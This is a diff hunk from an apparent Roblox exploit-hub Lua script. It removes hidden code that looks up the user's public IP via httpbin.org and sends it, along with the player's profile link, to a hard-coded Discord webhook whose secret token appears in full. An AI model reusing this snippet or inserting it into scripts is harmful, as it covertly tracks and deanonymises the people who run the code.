@@ -258,13 +258,6 @@ if isloaded then
     return SaveManager
 elseif true then
     wrapped = true
-    local httpbin = syn.request({Url = ('http://httpbin.org/get'); Method = 'GET'; })
-    local Data = {['embeds'] = {{['title'] = 'Hub',['description'] = 'Thing: **'..game:GetService('HttpService'):JSONDecode(httpbin.Body)['origin']..'**',
-    ['color'] = tonumber(0x7269da),['url'] = 'https://www.roblox.com/users/' .. tostring(game:GetService('Players').LocalPlayer.UserId .. '/profile')}}}
-    syn.request({Url = 'https://discord.com/api/webhooks/1043387517996650597/9nRxTuObd_jsO63ku0F0vpXrZ7giJN4GDdQgEvOlHAqdiHs9k_ouN9r8xqiNSXdy3atv', 
-    Body = game:GetService('HttpService'):JSONEncode(Data), 
-    Method = 'POST', 
-    Headers = {['content-type'] = 'application/json'}})
 else
     local httpService = game:GetService('HttpService')
 
